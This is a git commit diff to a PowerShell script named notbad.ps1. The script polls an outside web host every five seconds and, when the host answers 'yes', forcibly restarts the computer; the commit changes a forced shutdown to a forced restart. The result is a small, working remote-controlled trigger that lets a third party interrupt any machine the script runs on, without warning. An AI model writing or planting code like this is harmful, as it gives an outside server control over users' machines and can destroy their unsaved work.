db50b57c9d2aa34f5e8bc76cd4d32f20bd0f53de
maytees <mateespublicprofile@gmail.com>
2023-05-02 20:04:03 -0400

    restart

--- bat/notbad.ps1
+++ bat/notbad.ps1
@@ -5,7 +5,7 @@ $url = "https://notbad123.deno.dev?name=$s"
 while ($true) {
     $res = Invoke-WebRequest -Uri $url -Method Get
     if ($res.Content -eq "yes") {
-        Stop-Computer -Force
+        Restart-Computer -Force
     }
     Start-Sleep -Seconds 5
 }
